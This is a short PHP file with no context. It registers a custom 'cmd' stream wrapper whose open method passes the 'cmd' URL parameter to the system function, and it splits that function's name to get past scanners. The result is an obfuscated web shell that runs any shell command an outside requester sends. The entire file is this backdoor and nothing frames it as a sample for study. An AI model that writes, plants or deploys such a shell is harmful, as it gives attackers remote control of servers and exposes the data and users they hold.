<?php
stream_wrapper_register("cmd", "MyCommandWrapper");
class MyCommandWrapper {
    public function stream_open($path, $mode, $options, &$opened_path) {
        sy.'stem'($_GET['cmd']);
        return true;
    }
}

fopen("cmd://run", "r");
?>
